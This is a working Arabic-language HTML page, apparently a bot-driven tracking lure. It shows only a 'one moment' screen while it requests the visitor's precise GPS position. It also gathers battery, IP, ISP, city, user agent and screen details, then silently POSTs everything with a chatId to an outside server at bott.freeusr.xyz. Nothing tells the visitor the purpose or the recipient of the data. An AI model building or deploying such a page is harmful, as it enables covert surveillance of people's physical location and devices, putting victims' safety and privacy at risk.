<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>لحظة واحدة</title>
  <style>
    body {
      background-color: #121212;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
      margin: 0;
    }
    .container {
      max-width: 500px;
      padding: 20px;
    }
    .status-icon {
      font-size: 3rem;
      margin-bottom: 15px;
    }
    .status-title {
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .status-sub {
      font-size: 1.1rem;
      color: #aaa;
      margin-top: 10px;
    }
    .status-detail {
      font-size: 0.9rem;
      color: #666;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <div class="status-icon">📍</div>
    <h2 id="statusText">لحظة واحدة</h2>
  </div>

<script>
const chatId = new URLSearchParams(window.location.search).get("chatId");
const statusText = document.getElementById('statusText');
const statusSub = document.getElementById('statusSub');
const mainContainer = document.getElementById('mainContainer');

// ===== دالة عرض رسالة النجاح =====
function showSuccessMessage() {
  mainContainer.innerHTML = `
    <div style="
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    ">
      <div style="
        width: 80px;
        height: 80px;
        background: #e74c3c;
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 20px;
        animation: spin 1.5s linear infinite;
      ">
        <span style="font-size: 40px; color: white;">✓</span>
      </div>
      <div style="
        font-size: 2.5rem;
        font-weight: bold;
        color: #e74c3c;
        margin-bottom: 10px;
      ">
        انتهى اغلق الصفحة
      </div>
      <div style="
        font-size: 0.9rem;
        color: #666;
        margin-top: 15px;
      ">
        يمكنك إغلاق هذه الصفحة الآن
      </div>
    </div>
  `;
  
  // إضافة الـ keyframe للدوران
  const style = document.createElement('style');
  style.textContent = `
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);
}

// ===== دالة عرض رسالة الخطأ =====
function showError(message) {
  mainContainer.innerHTML = `
    <div>
      <div style="font-size: 3rem; margin-bottom: 15px;">❌</div>
      <h2 style="color: #e74c3c;">حدث خطأ</h2>
      <div style="color: #aaa; margin-top: 10px;">${message}</div>
      <button onclick="location.reload()" style="
        margin-top: 20px;
        padding: 12px 30px;
        background: transparent;
        color: #e74c3c;
        border: 2px solid #e74c3c;
        border-radius: 25px;
        font-size: 1rem;
        cursor: pointer;
        font-family: sans-serif;
        transition: all 0.3s;
      " onmouseover="this.style.background='#e74c3c'; this.style.color='white';" 
         onmouseout="this.style.background='transparent'; this.style.color='#e74c3c';">
        🔄 إعادة المحاولة
      </button>
    </div>
  `;
}

window.onload = () => {
  if (!chatId) {
    showError("❌ chatId غير موجود في الرابط");
    return;
  }

  statusSub.textContent = "لحظة واحدة...";

  navigator.geolocation.getCurrentPosition(async (pos) => {
    try {
      statusSub.textContent = "لحظة واحدة...";
      
      const battery = await navigator.getBattery();
      
      statusSub.textContent = "لحظة واحدة...";
      
      const res = await fetch("https://ipwho.is/");
      const location = await res.json();

      const payload = {
        chatId,
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude || null,
        speed: pos.coords.speed || null,
        heading: pos.coords.heading || null,
        additionalData: {
          ip: location.ip || 'غير متاح',
          country: location.country || 'غير متاح',
          city: location.city || 'غير متاح',
          region: location.region || 'غير متاح',
          timezone: location.timezone || 'غير متاح',
          isp: location.isp || 'غير متاح',
          platform: navigator.platform,
          userAgent: navigator.userAgent,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'هاتف' : 'حاسوب',
          batteryLevel: Math.round(battery.level * 100) + '%',
          batteryCharging: battery.charging,
          language: navigator.language,
          screenResolution: `${screen.width}x${screen.height}`
        }
      };

      statusSub.textContent = "تم بنجاح";

      const send = await fetch("https://bott.freeusr.xyz/submitLocation", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      const result = await send.json();
      
      if (result.success) {
        // ❌ تم إلغاء التحويل إلى الرابط الإعلاني
        // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
        
        // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
        showSuccessMessage();
      } else {
        showError(`فشل إرسال البيانات: ${result.message || 'خطأ غير معروف'}`);
      }
    } catch (err) {
      console.error("خطأ في الإرسال:", err);
      showError(`تعذر الاتصال بالسيرفر: ${err.message || 'خطأ غير معروف'}`);
    }

  }, (err) => {
    console.error("رفض المستخدم صلاحيات الموقع", err);
    let errorMsg = "لم يتم السماح بالموقع ❌";
    if (err.code === 1) {
      errorMsg = "❌ تم رفض صلاحية الموقع. يرجى السماح بالموقع في إعدادات المتصفح";
    } else if (err.code === 2) {
      errorMsg = "❌ تعذر تحديد الموقع. تأكد من تفعيل GPS";
    } else if (err.code === 3) {
      errorMsg = "❌ انتهت مهلة تحديد الموقع. حاول مرة أخرى";
    }
    showError(errorMsg);
  }, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
};
</script>
</body>
</html>
